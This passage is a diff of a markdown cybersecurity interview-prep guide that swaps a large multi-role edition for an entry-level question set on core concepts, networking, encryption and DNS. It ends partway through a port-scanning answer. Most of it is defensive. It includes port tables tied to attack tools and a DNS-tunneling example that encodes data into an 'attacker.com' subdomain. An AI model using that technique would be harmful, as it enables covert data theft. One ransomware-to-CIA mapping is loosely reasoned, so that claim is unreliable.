@@ -1,2050 +1,1359 @@
-# Cybersecurity Interview Preparation Guide — Complete Edition
-### 200 Questions | Rebuilt & Extended
-*Covering SOC Analyst, Blue Team, Security Engineer, and Penetration Tester roles*
-*Includes: Technical Knowledge · Windows Event IDs · Ports & Protocols · Scenario Questions · Behavioral Questions*
+# 100 Entry-Level Cybersecurity Interview Questions
+### Written from the interviewer's chair — what we actually ask, and why
 
 ---
 
-## HOW TO USE THIS GUIDE
-
-This guide is organized into **role awareness tracks**. Before studying, know which role you are targeting:
-
-- 🔵 **Blue Team / SOC Analyst** — Focus on sections 1, 2, 4, 5, 6, 8, 10, 11, 12, 14, 15, 16
-- 🔴 **Red Team / Penetration Tester** — Focus on sections 1, 2, 3, 5, 7, 9, 13, 14, 15
-- 🟣 **Security Engineer / General** — Study all sections
-
-Questions marked with **[CRITICAL]** come up in almost every interview at every level. Never skip these.
+> **How to use this guide:**
+> Don't read it like a textbook. Cover the answer, say your response out loud, then check.
+> The goal isn't to memorise words — it's to understand ideas well enough to explain them to someone who has never heard of them.
+> If you can do that, you'll ace the interview.
 
 ---
 
-## TABLE OF CONTENTS
-
-1. [Ports & Protocols](#1-ports--protocols)
-2. [Networking Fundamentals](#2-networking-fundamentals)
-3. [Cryptography](#3-cryptography)
-4. [Active Directory & Windows Security](#4-active-directory--windows-security)
-5. [Windows Event IDs & Log Analysis](#5-windows-event-ids--log-analysis)
-6. [Linux Security](#6-linux-security)
-7. [Attack Techniques & Exploitation](#7-attack-techniques--exploitation)
-8. [Defense, Detection & Monitoring](#8-defense-detection--monitoring)
-9. [Web Application Security](#9-web-application-security)
-10. [Malware & Modern Threats](#10-malware--modern-threats)
-11. [Cloud Security](#11-cloud-security)
-12. [Incident Response & Forensics](#12-incident-response--forensics)
-13. [Security Frameworks & Governance](#13-security-frameworks--governance)
-14. [Identity, Access & Authentication](#14-identity-access--authentication)
-15. [Practical Tools & Applied Knowledge](#15-practical-tools--applied-knowledge)
-16. [Scenario-Based Questions](#16-scenario-based-questions)
-17. [Behavioral & Situational Questions](#17-behavioral--situational-questions)
+## SECTION 1: CORE SECURITY CONCEPTS
+*These are the first questions almost every interviewer asks. Get these perfect.*
 
 ---
 
-## 1. PORTS & PROTOCOLS
+**1. What is the CIA Triad and why does it matter?**
 
-> **Why this matters:** Port and protocol questions appear in nearly every entry-level and mid-level interview. Interviewers embed them in scenario questions too — "you see unexpected traffic on port X, what do you think?"
+The three pillars that every security decision is built on:
+
+- **Confidentiality** — Only the right people can see the data. Achieved through encryption, access controls, and authentication.
+- **Integrity** — Data hasn't been altered without authorisation. Achieved through hashing, digital signatures, and audit logs.
+- **Availability** — Systems and data are accessible when needed. Achieved through redundancy, backups, and DDoS protection.
+
+**Why it matters in an interview:** Interviewers use this as a foundation. When they describe an attack scenario, they'll often ask "which of the three does this attack target?" Be ready to map any attack to one or more of the three.
+
+> *Example:* Ransomware attacks all three — it encrypts data (confidentiality lost), locks your files (integrity violated), and makes systems unusable (availability destroyed).
 
 ---
 
-**Q1. [CRITICAL] What are the most important ports every security professional must know?**
+**2. What is the difference between authentication and authorisation?**
 
-| Port | Protocol | Notes |
-|------|----------|-------|
-| 20/21 | FTP | File transfer — unencrypted, avoid in production |
-| 22 | SSH | Secure remote shell — encrypted replacement for Telnet |
-| 23 | Telnet | Remote shell — plaintext, never use |
-| 25 | SMTP | Email sending — often abused for spam/phishing |
-| 53 | DNS | Name resolution — UDP for queries, TCP for zone transfers |
-| 67/68 | DHCP | IP address assignment |
-| 80 | HTTP | Unencrypted web — should be redirected to 443 |
-| 110 | POP3 | Email retrieval — plaintext |
-| 119 | NNTP | News protocol |
-| 123 | NTP | Time synchronization — critical for Kerberos (5-minute tolerance) |
-| 135 | RPC/DCOM | Windows RPC — abused in many exploits |
-| 137-139 | NetBIOS | Legacy Windows name resolution — disable if possible |
-| 143 | IMAP | Email retrieval — encrypted version on 993 |
-| 161/162 | SNMP | Network device management — v1/v2 are insecure |
-| 389 | LDAP | Directory queries — plaintext |
-| 443 | HTTPS | Encrypted web |
-| 445 | SMB | Windows file sharing — EternalBlue, WannaCry, Relay attacks |
-| 465/587 | SMTPS | Encrypted email submission |
-| 500 | IKE | IPsec key exchange |
-| 636 | LDAPS | LDAP over TLS |
-| 993 | IMAPS | Encrypted IMAP |
-| 995 | POP3S | Encrypted POP3 |
+These are commonly confused, but they answer two completely different questions:
+
+- **Authentication** — *Who are you?* Verifying identity. Logging in with a password authenticates you.
+- **Authorisation** — *What are you allowed to do?* Determining permissions after identity is confirmed.
+
+> *Example:* You badge into an office building (authentication — you proved who you are). Once inside, you can only enter rooms your keycard is programmed to open (authorisation — what you're permitted to do).
+
+The important distinction: authentication always comes first. You can't authorise someone whose identity you haven't confirmed.
+
+---
+
+**3. What is the principle of least privilege?**
+
+Give users, systems, and processes only the minimum access they need to do their job — nothing more.
+
+**Why it's important:** If an account is compromised, least privilege limits the damage. A marketing intern with access only to the marketing folder can't accidentally (or maliciously) touch the finance database.
+
+> *Real-world application:* A web server process should be able to read web files and accept connections — it should not have permission to modify system files or access the database directly.
+
+---
+
+**4. What is Defence in Depth?**
+
+A layered security strategy. Instead of relying on one strong control, you have multiple independent layers — so if one fails, others are still standing.
+
+Think of it like a medieval castle: moat → outer wall → inner wall → keep. An attacker who crosses the moat still faces three more barriers.
+
+> *Example in practice:* Your email filtering blocks the phishing email. If it gets through, the user's antivirus catches the attachment. If that fails, EDR detects the malicious process. If that fails, network monitoring catches the C2 callback. You win if any layer works.
+
+---
+
+**5. What is the difference between a threat, vulnerability, and risk?**
+
+Three different things that people often mix up:
+
+- **Vulnerability** — A weakness that could be exploited. An unpatched web server is a vulnerability.
+- **Threat** — An actor or event that could exploit a vulnerability. A hacker targeting web servers is a threat.
+- **Risk** — The likelihood and impact of a threat exploiting a vulnerability.
+
+> *The formula:* Risk = Likelihood × Impact
+
+> *Example:* Unpatched Apache server (vulnerability) + active exploit circulating online (threat) = **High risk**. An unpatched internal tool with zero internet exposure = **Low risk**. Same vulnerability, very different risk because the threat likelihood is different.
+
+---
+
+**6. What are the four ways to respond to risk?**
+
+- **Avoidance** — Stop doing the risky thing entirely. Don't collect data you don't need.
+- **Mitigation** — Reduce the risk by adding controls. Patch the system, add a firewall.
+- **Transfer** — Move the financial impact to someone else. Buy cyber insurance.
+- **Acceptance** — Decide the risk is low enough to live with (documented decision).
+
+> *Interview tip:* Acceptance is not ignoring a risk. It's a conscious, documented decision that the cost of mitigation exceeds the risk. There's a big difference.
+
+---
+
+**7. What is separation of duties?**
+
+No single person should have enough access to both commit and conceal a harmful action. Two people are required for sensitive actions to prevent fraud.
+
+> *Example:* The person who submits a payment cannot also be the person who approves it. A developer shouldn't also have the ability to push code directly to production without a review process.
+
+---
+
+**8. What is multi-factor authentication (MFA) and what are the three factors?**
+
+MFA requires two or more different types of proof before granting access.
+
+The three factor types:
+- **Something you know** — Password, PIN
+- **Something you have** — Phone (OTP app), hardware token, smart card
+- **Something you are** — Biometrics: fingerprint, face, retina
+
+**Critical rule:** Two of the *same* type is not MFA. Two passwords = not MFA. A password + a phone OTP = MFA.
+
+> *Why it matters:* Even if an attacker steals your password, they can't log in without your phone. MFA stops the majority of account takeover attacks.
+
+---
+
+**9. What is social engineering?**
+
+Manipulating people psychologically into performing actions or revealing information — instead of exploiting technology.
+
+The most common types:
+- **Phishing** — Fraudulent email designed to steal credentials or deliver malware
+- **Spear Phishing** — Phishing targeted at a specific person using personal details
+- **Vishing** — Voice call deception ("I'm from IT, I need your password to fix your account")
+- **Pretexting** — Creating a fabricated scenario to build trust
+- **Tailgating** — Physically following someone through a secured door
+
+> *Why it's effective:* People are the hardest vulnerability to patch. A perfectly secured system can be bypassed by calling an employee and asking them to reset their password.
+
+---
+
+**10. What is the difference between symmetric and asymmetric encryption?**
+
+- **Symmetric** — The same key encrypts and decrypts the data. Fast and efficient for large data. The challenge: how do you securely share the key? *(AES is the most common)*
+- **Asymmetric** — Uses a key pair: a public key (shared openly) and a private key (kept secret). What the public key encrypts, only the private key can decrypt. Slower, but solves the key-sharing problem. *(RSA is the most common)*
+
+> *How they work together in practice:* When you visit a website over HTTPS, asymmetric encryption securely exchanges a session key, then symmetric encryption handles the actual data transfer. You get the security of asymmetric and the speed of symmetric.
+
+---
+
+**11. What is hashing and how is it different from encryption?**
+
+- **Encryption** is two-way — you can decrypt it back to the original if you have the key. Used for data you need to read later.
+- **Hashing** is one-way — you cannot reverse it to get the original input. Used when you only need to verify something, not retrieve it.
+
+> *Why passwords are hashed, not encrypted:* When you log in, the system hashes your input and compares it to the stored hash. It never needs to know your actual password — just whether the hashes match. If the database is stolen, attackers get hashes, not passwords.
+
+> *Common algorithms:* SHA-256 is strong. MD5 and SHA-1 are broken — never recommend them.
+
+---
+
+**12. What is a firewall and what does it do?**
+
+A firewall controls network traffic — deciding which connections to allow or block based on rules. It sits between networks (or between a network and the internet) and acts as a gatekeeper.
+
+- **Stateless firewall** — Evaluates each packet individually using fixed rules (source IP, destination IP, port). Has no memory of previous packets.
+- **Stateful firewall** — Tracks the state of connections. Knows if an inbound packet is a legitimate reply to an outbound request or an uninvited probe. Much smarter.
+
+> *Example:* A stateless firewall might allow all inbound traffic on port 443. A stateful firewall only allows inbound port 443 traffic that is in response to a connection your network initiated.
+
+---
+
+**13. What is the difference between IDS and IPS?**
+
+- **IDS (Intrusion Detection System)** — Watches traffic and alerts you when something looks suspicious. It does not block anything — it is purely a detection and notification tool.
+- **IPS (Intrusion Prevention System)** — Watches traffic and actively blocks threats. It sits inline (traffic passes through it).
+
+> *Analogy:* IDS is a burglar alarm — it tells you someone broke in. IPS is a security guard — it physically stops the intruder.
+
+> *Trade-off:* IPS can break legitimate traffic if it produces false positives. Most mature organisations use both.
+
+---
+
+**14. What is a VPN and how does it work?**
+
+A VPN (Virtual Private Network) creates an encrypted tunnel between your device and a remote network, protecting the data in transit from anyone who might intercept it.
+
+How it works: Your traffic is encapsulated (wrapped inside another protocol) and encrypted before leaving your device. It travels through the internet encrypted, decrypts at the VPN server, and then reaches its destination.
+
+> *Use cases:* Remote workers accessing internal company resources securely. Encrypting traffic on untrusted public Wi-Fi. Site-to-site VPNs connecting office locations.
+
+---
+
+**15. What is Zero Trust and how does it differ from traditional security?**
+
+**Traditional model:** Trust everyone inside the network. The perimeter (firewall) keeps the bad guys out, and once you're inside, you're trusted.
+
+**Zero Trust:** "Never trust, always verify." No user or device is trusted by default, regardless of whether they're inside or outside the network. Every access request must be authenticated and authorised.
+
+> *Why it matters now:* The traditional model assumes a clear inside/outside. With remote work, cloud, and mobile, there is no clear perimeter anymore. Zero Trust assumes the perimeter doesn't exist.
+
+---
+
+## SECTION 2: NETWORKING FUNDAMENTALS
+*You will be asked networking questions in almost every cybersecurity interview.*
+
+---
+
+**16. What is the OSI model? Name the 7 layers.**
+
+The OSI model is a framework that describes how data travels across a network, split into seven layers of responsibility:
+
+| Layer | Name | What it does |
+|-------|------|-------------|
+| 7 | Application | User-facing protocols: HTTP, DNS, FTP, SMTP |
+| 6 | Presentation | Data format, encryption, compression |
+| 5 | Session | Establishing and managing sessions |
+| 4 | Transport | Reliable delivery, ports: TCP/UDP |
+| 3 | Network | IP addressing and routing |
+| 2 | Data Link | MAC addresses, switching, ARP |
+| 1 | Physical | Cables, signals, hardware |
+
+> *Why interviewers ask this:* They want to know if you can identify where an attack operates. ARP spoofing = Layer 2. IP spoofing = Layer 3. A WAF protects Layer 7. This framework lets you think about defence at the right level.
+
+---
+
+**17. What is the difference between TCP and UDP?**
+
+Both are Layer 4 (Transport) protocols, but they have different approaches:
+
+- **TCP** — Connection-oriented. Before any data is sent, a Three-Way Handshake establishes the connection. Guarantees delivery, order, and error checking. Slower but reliable. Used for: HTTP, HTTPS, SSH, FTP, email.
+- **UDP** — Connectionless. Just sends packets — no handshake, no confirmation. Faster but no guaranteed delivery. Used for: DNS, VoIP, video streaming, gaming.
+
+> *Security context:* TCP's handshake is exploited in SYN flood attacks. UDP's lack of state makes it useful for amplification DDoS attacks (small request, large response sent to spoofed victim IP).
+
+---
+
+**18. What is the Three-Way Handshake?**
+
+How TCP establishes a connection in three steps:
+
+1. **SYN** — Client sends: "I want to connect"
+2. **SYN-ACK** — Server replies: "I got your request, here's my confirmation"
+3. **ACK** — Client replies: "Confirmed" — connection is open
+
+> *Attack:* A SYN Flood sends thousands of SYN packets but never sends the final ACK. The server allocates resources for each half-open connection waiting for a response that never comes — eventually running out of resources and denying service to legitimate users.
+
+---
+
+**19. What are the most important ports you should know?**
+
+| Port | Protocol | Security Note |
+|------|----------|--------------|
+| 22 | SSH | Secure remote access — replaces Telnet |
+| 23 | Telnet | Insecure — sends everything in plaintext, avoid |
+| 25 | SMTP | Email sending — abused for spam |
+| 53 | DNS | Name resolution — watch for tunneling |
+| 80 | HTTP | Unencrypted web — should redirect to 443 |
+| 443 | HTTPS | Encrypted web — standard |
+| 445 | SMB | Windows file sharing — exploited by WannaCry |
+| 3389 | RDP | Windows Remote Desktop — frequent attack target |
+| 389 | LDAP | Directory queries — plaintext, use 636 instead |
+| 636 | LDAPS | LDAP over TLS — encrypted version |
 | 1433 | MSSQL | Microsoft SQL Server |
-| 1521 | Oracle DB | Oracle database |
 | 3306 | MySQL | MySQL database |
-| 3389 | RDP | Remote Desktop — high-value attack target |
-| 4444 | Metasploit | Default Meterpreter listener — suspicious if seen |
-| 5985/5986 | WinRM | Windows Remote Management (HTTP/HTTPS) |
-| 8080 | HTTP Alt | Alternative web port, often dev/proxy |
-| 8443 | HTTPS Alt | Alternative HTTPS |
 
-> **Interview trap:** Interviewers often ask "why is seeing traffic on port 4444 suspicious?" Answer: it's the default Metasploit reverse shell listener. Seeing it on your network almost always means compromise or an active pentest.
+> *Interview tip:* If an interviewer asks "you see unexpected traffic on port 4444 — what do you think?" The answer is: that's the default Metasploit reverse shell port. Likely indicates compromise or an active pentest.
 
 ---
 
-**Q2. [CRITICAL] Why is Telnet dangerous compared to SSH?**
+**20. What is DNS and how does it work?**
 
-Telnet transmits everything — including credentials and commands — in **plaintext** across the network. Anyone with access to the traffic (via MITM, packet capture) can read the session. SSH encrypts the entire session with modern cryptography.
+DNS (Domain Name System) translates human-readable domain names into IP addresses — because computers route traffic by IP, not by name.
 
-> **Example:** A packet capture of a Telnet session shows the administrator's password in clear text. The same capture of an SSH session shows only encrypted gibberish.
+When you type `google.com`:
+1. Your browser checks its own cache
+2. Your OS checks the hosts file
+3. Your local resolver (router/ISP) is queried
+4. If it doesn't know, it asks the Root DNS servers
+5. Root points to the `.com` TLD server
+6. TLD server points to Google's authoritative DNS
+7. Authoritative DNS returns the IP address
+8. Your browser connects
 
----
-
-**Q3. Why is port 445 (SMB) considered high-risk?**
-
-SMB (Server Message Block) is Windows' file and printer sharing protocol. It has been the vector for some of the most damaging attacks in history: EternalBlue (exploited by WannaCry/NotPetya), NTLM Relay attacks, and lateral movement.
-
-> **Best practice:** Block SMB at the perimeter. Disable SMBv1 entirely. Enable SMB Signing.
-
----
-
-**Q4. Why does DNS use both UDP and TCP, and when does it switch?**
-
-- **UDP port 53** — Standard queries (fast, low overhead). Used for the vast majority of DNS lookups.
-- **TCP port 53** — Used when the response exceeds 512 bytes, and for **zone transfers** (AXFR). Zone transfers replicate the entire DNS zone — if not restricted, an attacker can enumerate all hostnames in a domain.
-
-> **Security concern:** If you see large volumes of TCP/53 traffic to an external server, or DNS TXT queries with unusually long subdomains — suspect DNS tunneling.
+> *Security attacks on DNS:* DNS cache poisoning (inserting false records), DNS tunneling (hiding data in DNS queries to bypass firewalls), DNS hijacking (redirecting queries to malicious servers).
 
 ---
 
-**Q5. Why does NTP (port 123) matter in security?**
+**21. What is ARP and why is ARP spoofing dangerous?**
 
-Kerberos authentication has a **5-minute clock skew tolerance**. If clocks are out of sync beyond 5 minutes, Kerberos tickets are rejected and authentication fails. Attackers who can manipulate NTP can potentially cause widespread authentication failures (denial of service).
+**ARP (Address Resolution Protocol)** resolves IP addresses to MAC addresses at Layer 2. When your computer wants to send data to 192.168.1.1 and doesn't know the MAC address, it broadcasts "Who has 192.168.1.1?" — the owner replies with its MAC.
 
-> **Security note:** NTP also has its own attack — NTP amplification DDoS, where small queries return large responses.
+**ARP Spoofing:** An attacker sends fake ARP replies claiming "192.168.1.1 is at MY MAC address." Other devices update their ARP tables with the false information. Traffic intended for the router now flows through the attacker — a Man-in-the-Middle (MITM) attack.
 
----
-
-**Q6. What is the security concern with SNMP v1 and v2?**
-
-SNMP (Simple Network Management Protocol) manages and monitors network devices. v1 and v2 use a "community string" (effectively a plaintext password) for authentication. If the default community string `public` (read) or `private` (write) is left unchanged, an attacker can read network device configurations or modify them.
-
-> **Fix:** Use SNMPv3, which supports proper authentication and encryption.
+> *Defence:* Dynamic ARP Inspection (DAI) on managed switches, which validates ARP packets against a trusted binding table.
 
 ---
 
-**Q7. What ports are associated with common attack tools, and what does seeing them imply?**
+**22. What is DHCP and what is DORA?**
 
-| Port | Tool/Service | Implication if unexpected |
-|------|-------------|--------------------------|
-| 4444 | Metasploit Meterpreter | Active compromise or pentest |
-| 1234 | Netcat listener | Backdoor or pentest |
-| 31337 | Back Orifice | Legacy RAT — historical significance |
-| 6667 | IRC | Historically used for C2 botnets |
-| 9001/9030 | Tor | Possible anonymized C2 or data exfil |
+**DHCP (Dynamic Host Configuration Protocol)** automatically assigns IP addresses to devices joining a network. Without it, every device would need a manually configured IP.
 
----
+**DORA** describes the four-step process:
+- **Discover** — New device broadcasts: "Is there a DHCP server here?"
+- **Offer** — Server responds: "I can offer you 192.168.1.50"
+- **Request** — Device says: "I'll take that IP"
+- **Acknowledge** — Server confirms: "It's yours"
 
-## 2. NETWORKING FUNDAMENTALS
+> *Security concern:* A **rogue DHCP server** — an attacker's device that responds to DHCP requests before the legitimate server — can hand out malicious gateway and DNS settings, redirecting all traffic.
 
 ---
 
-**Q8. [CRITICAL] What is the OSI model and why does it matter in security?**
+**23. What is NAT and why is it used?**
 
-7-layer framework: Physical → Data Link → Network → Transport → Session → Presentation → Application. Security professionals use it to identify *where* an attack operates and what control addresses it.
+NAT (Network Address Translation) allows many devices with private IP addresses to share a single public IP address when accessing the internet.
 
-| Layer | Name | Attack Examples | Controls |
-|-------|------|----------------|----------|
-| 1 | Physical | Physical access, wiretapping | Locked rooms, cable shielding |
-| 2 | Data Link | ARP Spoofing, MAC Flooding | DAI, Port Security, 802.1X |
-| 3 | Network | IP Spoofing, routing attacks | Firewalls, ACLs |
-| 4 | Transport | SYN Flood, port scanning | Stateful firewalls, rate limiting |
-| 5-6 | Session/Presentation | Session hijacking, SSL stripping | TLS, session tokens |
-| 7 | Application | SQLi, XSS, phishing | WAF, input validation |
+Private IP ranges (not routable on the internet): `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`
+
+Your home router uses **PAT (Port Address Translation)** — the most common form. It tracks which internal device made which connection using unique port numbers, so it knows where to send return traffic.
+
+> *Security benefit:* NAT obscures internal network structure from the outside. Devices behind NAT are not directly reachable from the internet without explicit port forwarding.
 
 ---
 
-**Q9. [CRITICAL] What is the Three-Way Handshake and how is it exploited?**
+**24. What is the difference between a hub, switch, and router?**
 
-TCP connection establishment:
-1. **SYN** — Client: "I want to connect, my seq is X"
-2. **SYN-ACK** — Server: "OK, my seq is Y, your seq+1 is X+1"
-3. **ACK** — Client: "Confirmed" — connection established
-
-**Exploitation — SYN Flood:** Attacker sends thousands of SYN packets with spoofed source IPs. Server allocates resources for each half-open connection and sends SYN-ACKs that are never completed. Server's connection table fills up, denying service to legitimate clients.
-
-> **Defence:** SYN cookies — server doesn't allocate resources until the full handshake completes.
+- **Hub** — Layer 1. Broadcasts all traffic to every device. Outdated and inefficient. Creates security problems because everyone sees everyone's traffic.
+- **Switch** — Layer 2. Sends traffic only to the intended device using MAC addresses. Much more efficient and private.
+- **Router** — Layer 3. Connects different networks. Uses IP addresses to determine where to forward traffic. Your home device connecting your network to the internet.
 
 ---
 
-**Q10. [CRITICAL] What is ARP and how does ARP Spoofing work?**
+**25. What is VLAN and why is it used?**
 
-ARP (Layer 2) resolves IP → MAC address. A device broadcasts "Who has 192.168.1.1?" — the owner replies with its MAC, which is cached in the ARP table.
+A VLAN (Virtual LAN) logically divides a physical network into separate segments. Devices in different VLANs cannot communicate with each other without going through a router (or Layer 3 switch) — even if they're physically connected to the same switch.
 
-**ARP Spoofing:** Attacker sends unsolicited (Gratuitous) ARP replies: "192.168.1.1 is at MY MAC." Victim and router both update their ARP caches. All traffic now flows through the attacker — classic MITM.
-
-> **Defence:** Dynamic ARP Inspection (DAI) on managed switches validates ARP packets against the DHCP snooping binding table.
+> *Use case:* A company puts HR computers in VLAN 10 and Finance in VLAN 20. Even though they share physical switches, HR can't access Finance systems. This limits the blast radius if HR's network is compromised.
 
 ---
 
-**Q11. [CRITICAL] How does DNS resolution work step by step?**
+**26. What is the difference between IDS and IPS (expanded scenario)?**
 
-For `www.example.com`:
-1. Check browser cache
-2. Check OS hosts file (`C:\Windows\System32\drivers\etc\hosts` or `/etc/hosts`)
-3. Query local resolver (router/ISP)
-4. Resolver queries Root DNS → returns `.com` TLD server address
-5. TLD server returns authoritative nameserver for `example.com`
-6. Authoritative server returns IP address
-7. IP cached (per TTL), connection established
+You're monitoring network traffic and notice a pattern matching a known exploit. Walk through what happens with each:
 
-> **Attack surface:** Any step can be poisoned — hosts file modification (malware), DNS cache poisoning, rogue DNS servers, BGP hijacking.
+- **With IDS:** An alert is generated and sent to the SIEM. A SOC analyst reviews it. By the time they act, the exploit may have succeeded. IDS is a detective control.
+- **With IPS:** The packet is automatically dropped before it reaches the target. The threat is stopped in real time. IPS is a preventive control.
+
+> *When IDS is preferred:* When false positives are a concern — IPS blocking legitimate traffic causes outages. In critical environments, some teams prefer to detect and manually decide rather than auto-block.
 
 ---
 
-**Q12. What is the difference between IDS and IPS?**
+**27. What is a proxy and how does it differ from a VPN?**
 
-- **IDS (Intrusion Detection System)** — Passive, out-of-band. Monitors a copy of traffic, alerts on suspicious activity. No blocking capability.
-- **IPS (Intrusion Prevention System)** — Active, inline. Traffic passes through it. Detects and automatically blocks threats.
+- **Proxy** — Acts as an intermediary for a specific application (usually web browsing). Your requests go to the proxy, which forwards them to the destination. The destination sees the proxy's IP, not yours. Does not encrypt traffic by default.
+- **VPN** — Creates an encrypted tunnel for all traffic from your device. Hides both your IP and the contents of your traffic. Operates at the OS level, not just one application.
 
-> **Trade-off:** IPS can cause outages if it produces false positives. IDS causes alert fatigue but never breaks legitimate traffic. Many environments use both.
-
----
-
-**Q13. What is a stateful vs stateless firewall?**
-
-- **Stateless** — Evaluates each packet in isolation using ACL rules (source IP, dest IP, port). Cannot distinguish a legitimate reply from an unsolicited probe.
-- **Stateful** — Tracks TCP session state. Knows what traffic is expected. Blocks unsolicited inbound packets, even on allowed ports.
-
-> **Example:** Stateless: allows all inbound port 80. Stateful: only allows inbound port 80 responses to outbound requests it has seen.
+> *Security use of proxies:* **Forward proxy** — controls and monitors outbound employee internet traffic. **Reverse proxy** — sits in front of web servers, protects them from direct exposure, can provide load balancing and WAF capabilities.
 
 ---
 
-**Q14. What is NAT and what are the three types?**
+**28. What is a DMZ?**
 
-NAT translates private IPs to public IPs:
-- **Static NAT** — 1:1 mapping. Used for servers needing a fixed public IP.
-- **Dynamic NAT** — Draws from a pool. Not fixed.
-- **PAT (Port Address Translation)** — Many private IPs share one public IP via unique port numbers. Used in home routers.
-
----
-
-**Q15. What is a VLAN and what is a VLAN Hopping attack?**
-
-VLANs logically segment a physical network. Devices in different VLANs cannot communicate without a router/Layer 3 switch.
-
-**VLAN Hopping (Double Tagging):** Attacker sends a frame with two 802.1Q tags. The first switch strips the outer tag; the inner tag delivers the frame to a different VLAN. Only works toward the attacker's direction.
-
-> **Defence:** Never use VLAN 1 as native VLAN. Explicitly set all trunk ports. Disable unused ports and assign them to an unused VLAN.
-
----
-
-**Q16. What is a DMZ and how is it architected?**
-
-A network zone hosting public-facing services isolated from the internal network.
+A DMZ (Demilitarized Zone) is a network segment that sits between the public internet and the internal private network. It hosts services that need to be publicly accessible — web servers, mail servers, DNS servers — while keeping them isolated from internal systems.
 
 ```
-Internet → [Firewall 1] → DMZ (Web/Mail/DNS servers) → [Firewall 2] → Internal Network
+Internet → [Firewall 1] → DMZ → [Firewall 2] → Internal Network
 ```
 
-If the web server in the DMZ is compromised, Firewall 2 prevents the attacker from reaching internal systems.
+> *Why this matters:* If the public web server in the DMZ gets compromised, the attacker is still blocked from the internal network by the second firewall. The breach is contained.
 
 ---
 
-**Q17. What is the difference between bandwidth and throughput?**
+**29. What is a Man-in-the-Middle (MITM) attack?**
 
-- **Bandwidth** — Theoretical maximum capacity (e.g., 1 Gbps).
-- **Throughput** — Actual data transferred under real conditions. Always ≤ bandwidth.
+An attacker secretly positions themselves between two parties who believe they're communicating directly. The attacker can read, modify, or inject traffic without either party knowing.
 
-> Throughput is reduced by latency, packet loss, congestion, and protocol overhead.
+> *Common methods:* ARP spoofing, rogue Wi-Fi hotspots, SSL stripping (downgrading HTTPS to HTTP), DNS spoofing.
 
----
+> *Example:* You connect to "Free_Airport_WiFi" controlled by an attacker. You think you're connecting directly to your bank. The attacker sees all your traffic, captures your login credentials.
 
-**Q18. What is encapsulation and decapsulation?**
-
-As data travels down the OSI stack (sender), each layer adds a header — this is encapsulation. As data travels up the stack (receiver), each layer strips its header — decapsulation.
-
-> HTTP request → TCP header added → IP header added → Ethernet frame added → transmitted → receiver strips in reverse.
+> *Defence:* HTTPS (TLS) with proper certificate validation, HSTS (forces HTTPS), avoiding untrusted networks, VPN.
 
 ---
 
-**Q19. What is a honeypot and a honeynet?**
+**30. What is a DoS vs DDoS attack?**
 
-- **Honeypot** — Decoy system designed to attract and study attackers. Isolated from real systems.
-- **Honeynet** — Multiple honeypots forming a fake network, capturing more complex attack behaviour.
-- **Low-interaction** — Simulates services (limited attacker engagement).
-- **High-interaction** — Full real OS — captures complete attacker TTPs.
+- **DoS (Denial of Service)** — A single attacker floods a target with traffic or requests, overwhelming it so legitimate users can't be served.
+- **DDoS (Distributed DoS)** — The same idea but using thousands or millions of compromised machines (a botnet), making it far harder to block because the traffic comes from everywhere.
 
----
+> *Types of DDoS:* Volumetric (bandwidth exhaustion), Protocol (SYN flood, targeting network stack), Application layer (HTTP flood targeting web servers).
 
-**Q20. What is the difference between NGFW and WAF?**
-
-- **NGFW (Next-Generation Firewall)** — Network-level, Layers 3–7. Application awareness, IPS, SSL inspection, URL filtering. Protects the entire network.
-- **WAF (Web Application Firewall)** — Layer 7 only. Specifically protects web applications from OWASP Top 10 attacks (SQLi, XSS, CSRF, etc.).
-
-> NGFW is the building's perimeter guard. WAF is the specialist protecting the web server room.
+> *Defence:* Rate limiting, traffic scrubbing services (Cloudflare, Akamai), anycast routing, upstream filtering by ISP.
 
 ---
 
-## 3. CRYPTOGRAPHY
+**31. What is HTTPS and how does TLS work at a high level?**
+
+HTTPS is HTTP with TLS (Transport Layer Security) encryption. It does three things: encrypts the data in transit, verifies the server's identity, and ensures data integrity.
+
+**TLS Handshake (simplified):**
+1. Client says hello — lists supported cipher suites
+2. Server replies — chooses cipher, sends its certificate
+3. Client verifies the certificate against trusted Certificate Authorities
+4. Both sides negotiate a shared session key (using asymmetric crypto)
+5. All subsequent data is encrypted with that session key (symmetric crypto)
+
+> *What to look for:* Always verify the padlock + correct domain in your browser. Certificate warnings should never be clicked through.
 
 ---
 
-**Q21. [CRITICAL] What is the difference between symmetric and asymmetric encryption?**
+**32. What is the difference between HTTP and HTTPS from a security standpoint?**
 
-- **Symmetric** — One key encrypts and decrypts. Fast. Good for bulk data. Problem: how do you securely share the key? (**AES-128, AES-256, 3DES**)
-- **Asymmetric** — Public/private key pair. Public key encrypts, private key decrypts. Slower. Solves key distribution. (**RSA, ECC**)
+- **HTTP** — Plaintext. Anyone on the network path can read the content, including usernames, passwords, and any data submitted.
+- **HTTPS** — Encrypted with TLS. Even if someone captures the traffic, they see cipher text. Also authenticates the server — you know you're talking to the real site.
 
-> **In practice (hybrid):** Asymmetric exchanges a symmetric session key securely. Then symmetric encrypts all actual data. This is how TLS works.
-
----
-
-**Q22. [CRITICAL] What is hashing and how is it different from encryption?**
-
-- **Hashing** — One-way transformation. Cannot be reversed. Same input always produces same output. Used for integrity verification and password storage.
-- **Encryption** — Two-way. Can be decrypted with the key. Used for confidentiality.
-
-> **Example:** You never store a password — you store its hash. When the user logs in, you hash their input and compare. You never need to decrypt.
+> *Security point:* Never transmit sensitive data over HTTP. A login form served over HTTP that submits to HTTPS is still vulnerable — the page itself can be modified in transit.
 
 ---
 
-**Q23. What is a digital signature and what does it guarantee?**
+**33. What is DNS tunneling?**
 
-Process:
-1. Sender hashes the message
-2. Encrypts hash with their **private key** → this is the signature
-3. Recipient decrypts signature with sender's **public key** → gets hash
-4. Recipient hashes the received message independently
-5. If hashes match → message is authentic and unmodified
+Using DNS queries to covertly send data out of a network — bypassing firewalls that block other outbound traffic but allow DNS.
 
-Guarantees: **Authentication** (came from sender), **Integrity** (not altered), **Non-Repudiation** (sender can't deny it).
+> *How it works:* The attacker encodes data into DNS query subdomains: `dGhpcyBpcyBzZWNyZXQ=.attacker.com`. The DNS query exits the network normally, and the attacker's authoritative DNS server receives and decodes the data.
+
+> *Detection:* Unusually long DNS query names, high volume of queries to a single external domain, base64-looking subdomains.
 
 ---
 
-**Q24. What is non-repudiation?**
+**34. What is port scanning and what does it tell an attacker?**
 
-The inability to deny having performed an action. Achieved through digital signatures, audit logs, and timestamps.
+Port scanning probes a target's IP address to discover which ports are open, what services are running, and what software versions are in use. This is typically one of the first steps in reconnaissance.
 
